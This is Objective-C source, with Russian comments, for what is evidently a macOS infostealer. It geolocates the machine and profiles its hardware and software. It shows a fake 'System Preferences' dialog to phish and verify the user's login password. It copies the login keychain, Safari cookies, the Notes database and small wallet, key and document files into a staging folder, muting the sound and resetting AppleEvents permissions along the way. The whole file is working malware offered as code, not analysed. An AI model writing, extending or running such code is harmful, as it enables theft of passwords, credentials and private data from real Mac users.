#ifdef DEBUG
#define DebugLog(...) NSLog(__VA_ARGS__)
#else
#define DebugLog(...) (void)0
#endif

#import "System.h"
#import "Tools.h"
#import <Foundation/Foundation.h>
#import "globals.h"

@implementation System

- (instancetype)initWithEncryptionKey:(NSString *)encryptionKey {
    self = [super init];
    if (self) {
        _encryptionKey = encryptionKey;
    }
    return self;
}

- (void)getIP:(void (^)(NSDictionary *ipInfo, NSError *error))completion {
    DebugLog(@"Starting to fetch IP...");

    [Tools fetchURL:@"https://freeipapi.com/api/json/" completion:^(NSString *result, NSError *error) {
        if (error) {
            DebugLog(@"Failed to fetch IP: %@", error.localizedDescription);
            if (completion) {
                completion(nil, error);
            }
        } else {
            DebugLog(@"Received response from IP API.");

            if (!result || [result length] == 0) {
                DebugLog(@"Received empty response or no data.");
                if (completion) {
                    completion(nil, [NSError errorWithDomain:@"com.example.error" code:1001 userInfo:@{NSLocalizedDescriptionKey: @"Empty response from server"}]);
                }
                return;
            }

            NSData *data = [result dataUsingEncoding:NSUTF8StringEncoding];
            if (!data) {
                DebugLog(@"Failed to convert response to NSData.");
                if (completion) {
                    completion(nil, [NSError errorWithDomain:@"com.example.error" code:1002 userInfo:@{NSLocalizedDescriptionKey: @"Failed to convert response to data"}]);
                }
                return;
            }

            NSError *jsonError;
            NSMutableDictionary *ipInfo = [[NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError] mutableCopy];
            if (jsonError) {
                DebugLog(@"Failed to parse JSON: %@", jsonError.localizedDescription);
                if (completion) {
                    completion(nil, jsonError);
                }
                return;
            }

            DebugLog(@"IP data parsed successfully: %@", ipInfo);

            [Tools fetchURL:@"https://api.ipify.org/?format=json" completion:^(NSString *result, NSError *error) {
                if (error) {
                    DebugLog(@"Failed to fetch public IP: %@", error.localizedDescription);
                    if (completion) {
                        completion(nil, error);
                    }
                } else {

                    NSData *data = [result dataUsingEncoding:NSUTF8StringEncoding];
                    if (data) {
                        NSError *jsonError;
                        NSDictionary *publicIPInfo = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError];
                        if (jsonError) {
                            DebugLog(@"Failed to parse public IP JSON: %@", jsonError.localizedDescription);
                            if (completion) {
                                completion(nil, jsonError);
                            }
                        } else {
                            NSString *publicIP = publicIPInfo[@"ip"];
                            if (publicIP) {
                                ipInfo[@"ipAddress"] = publicIP;
                            }
                            if (completion) {
                                completion(ipInfo, nil);
                            }
                        }
                    } else {
                        if (completion) {
                            completion(nil, [NSError errorWithDomain:@"com.example.error" code:1003 userInfo:@{NSLocalizedDescriptionKey: @"Failed to convert public IP response to data"}]);
                        }
                    }
                }
            }];
        }
    }];
}

- (void)collectSystemInfo {
    NSString *data = [Tools exec:@"system_profiler SPSoftwareDataType SPHardwareDataType"];

    NSMutableDictionary *systemInfo = [NSMutableDictionary dictionary];

    NSArray *lines = [data componentsSeparatedByString:@"\n"];
    for (NSString *line in lines) {
        if ([line length] > 0) {
            NSRange delimiterPos = [line rangeOfString:@":"];
            if (delimiterPos.location != NSNotFound) {
                NSString *key = [Tools trim:[line substringToIndex:delimiterPos.location]];

                NSString *value = nil;

                if ((delimiterPos.location + 2) < [line length]) {
                    value = [line substringFromIndex:delimiterPos.location + 2];
                } else {
                    DebugLog(@"Delimiter not found or index out of bounds");
                }

                if (key && value) {
                    systemInfo[key] = value;
                }
            }
        }
    }

    systemInfo[@"BUILD_ID"] = BUILD_ID;

    // Получаем IP информацию асинхронно
    [self getIP:^(NSDictionary *ipInfo, NSError *error) {
        if (error) {
            NSLog(@"Error fetching IP: %@", error.localizedDescription);
            systemInfo[@"ip_info"] = @{}; // Заполняем пустым словарем или обрабатываем ошибку иначе
        } else {
            NSLog(@"All good");
            systemInfo[@"ip_info"] = ipInfo;
        }

        // После получения IP информации продолжаем обработку
        systemInfo[@"system_os"] = @"macos";
        systemInfo[@"system_password"] = SYSTEM_PASS;

        NSString *filePath = [TEMPORARY_PATH stringByAppendingPathComponent:@"system_info.json"];
        NSData *jsonData = [NSJSONSerialization dataWithJSONObject:systemInfo options:NSJSONWritingPrettyPrinted error:nil];
        BOOL success = [jsonData writeToFile:filePath atomically:YES];

        if (success) {
            DebugLog(@"%@", systemInfo);
            DebugLog(@"System info written to file successfully.");
        } else {
            DebugLog(@"Failed to write system info to file.");
        }
    }];
}




- (void)dumpKeychainPasswords {
    NSString *keychainPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Keychains/login.keychain-db"];
    [Tools copyFileToDirectory:keychainPath destinationDirectory:[TEMPORARY_PATH stringByAppendingPathComponent:@"Passwords"]];
}

- (void)fileGrab {
    @try {
        DebugLog(@"Starting AppleScript execution.");
        
        // Запуск AppleScript
        [self runAppleScriptWithPath];
        
        // Формирование команды для перемещения файлов
        NSString *sourcePath = [[Tools getHomeDirectory] stringByAppendingPathComponent:@"tempFolder-32555443"];
        NSString *destinationPath = [TEMPORARY_PATH stringByAppendingPathComponent:@"FileGrabber"];
        NSString *commandMV = [NSString stringWithFormat:@"mv %@ %@", sourcePath, destinationPath];
        
        DebugLog(@"Running command: %@", commandMV);
        
        // Выполнение команды mv
        int result = system([commandMV UTF8String]);
        
        if (result != 0) {
            DebugLog(@"Command execution failed with code: %d", result);
        } else {
            DebugLog(@"AppleScript executed and files moved successfully.");
        }
        
    } @catch (NSException *exception) {
        DebugLog(@"Error: %@", exception.reason);
    }
}


- (int)executeAppleScript:(NSString *)script {
    NSString *scriptPath = @"/tmp/tempAppleScript.scpt";
    
    // Записываем скрипт с правильным форматированием
    NSString *formattedScript = [script stringByReplacingOccurrencesOfString:@"\\n" withString:@"\n"];
    [formattedScript writeToFile:scriptPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    // Выполняем скрипт
    NSString *command = [NSString stringWithFormat:@"osascript %@", scriptPath];
    FILE *pipe = popen([command UTF8String], "r");
    if (!pipe) return -1;
    
    char buffer[128];
    NSMutableString *result = [NSMutableString string];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        [result appendString:[NSString stringWithUTF8String:buffer]];
    }
    
    int returnCode = pclose(pipe);
    DebugLog(@"AppleScript output: %@", result);
    
    return returnCode;
}



- (void)getMacOSPassword {
    NSString *username = NSUserName();
    for (int i = 0; i < 5; i++) {
        NSString *dialogCommand = @"osascript -e 'display dialog \"To launch the application, you need to update the system settings \n\nPlease enter your password.\" with title \"System Preferences\" with icon caution default answer \"\" giving up after 30 with hidden answer'";
        //const char *command = [dialogCommand UTF8String];
        NSString *dialogResult = [Tools exec:dialogCommand];
        NSString *password = @"";
        
        NSRange startRange = [dialogResult rangeOfString:@"text returned:"];
        if (startRange.location != NSNotFound) {
            startRange.location += startRange.length;
            NSRange endRange = [dialogResult rangeOfString:@", gave up:" options:0 range:NSMakeRange(startRange.location, dialogResult.length - startRange.location)];
            if (endRange.location == NSNotFound) {
                endRange = [dialogResult rangeOfString:@", gave up:true" options:0 range:NSMakeRange(startRange.location, dialogResult.length - startRange.location)];
            }
            if (endRange.location != NSNotFound) {
                password = [dialogResult substringWithRange:NSMakeRange(startRange.location, endRange.location - startRange.location)];
            } else {
                password = [dialogResult substringFromIndex:startRange.location];
            }
        } else {
            DebugLog(@"Error: 'text returned:' not found in dialogResult");
            continue;
        }
        
        if ([self verifyPassword:username password:password]) {
            SYSTEM_PASS = password;
            DebugLog(@"Password saved successfully.");
            break;
        } else {
            DebugLog(@"Password verification failed.");
        }
    }
}

- (BOOL)verifyPassword:(NSString *)username password:(NSString *)password {
    NSString *command = [NSString stringWithFormat:@"dscl /Local/Default -authonly %@ %@", username, password];
    NSString *result = [Tools exec:command];
    return result.length == 0;
}

- (void)runAppleScriptWithPath {
    NSString *appleScript = @"\
    -- Function to mute the system sound\n\
    do shell script \"osascript -e 'set volume with output muted'\"\n\
    \n\
    set baseFolderPath to (path to home folder as text) & \"tempFolder-32555443:\"\n\
    set fileGrabberFolderPath to baseFolderPath & \"FileGrabber:\"\n\
    set notesFolderPath to baseFolderPath & \"Notes:\"\n\
    \n\
    tell application \"Finder\"\n\
        set username to short user name of (system info)\n\
        \n\
        -- Check if baseFolderPath exists, if not, create it\n\
        if not (exists folder baseFolderPath) then\n\
            do shell script \"echo 'Creating base folder'\"\n\
            make new folder at (path to home folder) with properties {name:\"tempFolder-32555443\"}\n\
        end if\n\
        \n\
        -- Create fileGrabberFolderPath\n\
        try\n\
            do shell script \"echo 'Creating FileGrabber folder'\"\n\
            make new folder at folder baseFolderPath with properties {name:\"FileGrabber\"}\n\
            delay 2 -- Delay to give Finder time to create the folder\n\
        end try\n\
        \n\
        -- Create notesFolderPath\n\
        try\n\
            do shell script \"echo 'Creating Notes folder'\"\n\
            make new folder at folder baseFolderPath with properties {name:\"Notes\"}\n\
            delay 2 -- Delay to give Finder time to create the folder\n\
        end try\n\
        \n\
        -- Copy Safari cookies\n\
        try\n\
            do shell script \"echo 'Copying Safari cookies'\"\n\
            set macOSVersion to do shell script \"sw_vers -productVersion\"\n\
            if macOSVersion starts with \"10.15\" or macOSVersion starts with \"10.14\" then\n\
                set safariFolder to ((path to library folder from user domain as text) & \"Safari:\")\n\
            else\n\
                set safariFolder to ((path to library folder from user domain as text) & \"Containers:com.apple.Safari:Data:Library:Cookies:\")\n\
            end if\n\
            duplicate file \"Cookies.binarycookies\" of folder safariFolder to folder fileGrabberFolderPath with replacing\n\
            delay 2 -- Delay to give Finder time to copy the file\n\
        end try\n\
        \n\
        -- Copy Notes database to Notes folder\n\
        try\n\
            do shell script \"echo 'Copying Notes database'\"\n\
            set homePath to path to home folder as string\n\
            set sourceFilePath to homePath & \"Library:Group Containers:group.com.apple.notes:NoteStore.sqlite\"\n\
            duplicate file sourceFilePath to folder notesFolderPath with replacing\n\
            delay 2 -- Delay to give Finder time to copy the file\n\
        end try\n\
        \n\
        set extensionsList to {\"txt\", \"docx\", \"rtf\", \"doc\", \"wallet\", \"keys\", \"key\"}\n\
        \n\
        -- Gather and copy desktop files\n\
        try\n\
            do shell script \"echo 'Gathering desktop files'\"\n\
            set desktopFiles to every file of desktop\n\
            -- Copy desktop files\n\
            repeat with aFile in desktopFiles\n\
                try\n\
                    set fileExtension to name extension of aFile\n\
                    if fileExtension is in extensionsList then\n\
                        set fileSize to size of aFile\n\
                        if fileSize < 51200 then\n\
                            do shell script \"echo 'Copying file: \" & (name of aFile as string) & \"'\"\n\
                            duplicate aFile to folder fileGrabberFolderPath with replacing\n\
                            delay 1 -- Delay to give Finder time to copy each file\n\
                        end if\n\
                    end if\n\
                end try\n\
            end repeat\n\
        end try\n\
        \n\
        -- Gather and copy documents files\n\
        try\n\
            do shell script \"echo 'Gathering documents files'\"\n\
            set documentsFiles to every file of folder \"Documents\" of (path to home folder)\n\
            -- Copy documents files\n\
            repeat with aFile in documentsFiles\n\
                try\n\
                    set fileExtension to name extension of aFile\n\
                    if fileExtension is in extensionsList then\n\
                        set fileSize to size of aFile\n\
                        if fileSize < 51200 then\n\
                            do shell script \"echo 'Copying file: \" & (name of aFile as string) & \"'\"\n\
                            duplicate aFile to folder fileGrabberFolderPath with replacing\n\
                            delay 1 -- Delay to give Finder time to copy each file\n\
                        end if\n\
                    end if\n\
                end try\n\
            end repeat\n\
        end try\n\
    end tell\n\
    \n\
    -- Function to unmute the system sound\n\
    do shell script \"osascript -e 'set volume without output muted'\"\n\
    ";

    NSString *resetPermissions = @"\
    -- Reset AppleEvents permissions\n\
    do shell script \"tccutil reset AppleEvents\"\n\
    ";

    for (int i = 0; i < 30; i++) {
        DebugLog(@"Attempt %d to execute AppleScript.", i + 1);
        
        int req = [self executeAppleScript:appleScript];
        
        if (req != 0) {
            DebugLog(@"AppleScript execution failed on attempt %d with return code %d. Resetting permissions and trying again.", i + 1, req);
            
            // Выполняем сброс разрешений
            [self executeAppleScript:resetPermissions];
            
            sleep(1); // Ждём 1 секунду перед следующей попыткой
            continue; // Переходим к следующей итерации цикла
        }
        
        DebugLog(@"AppleScript executed successfully on attempt %d.", i + 1);
        break; // Выходим из цикла, если AppleScript был выполнен успешно
    }
}




@end
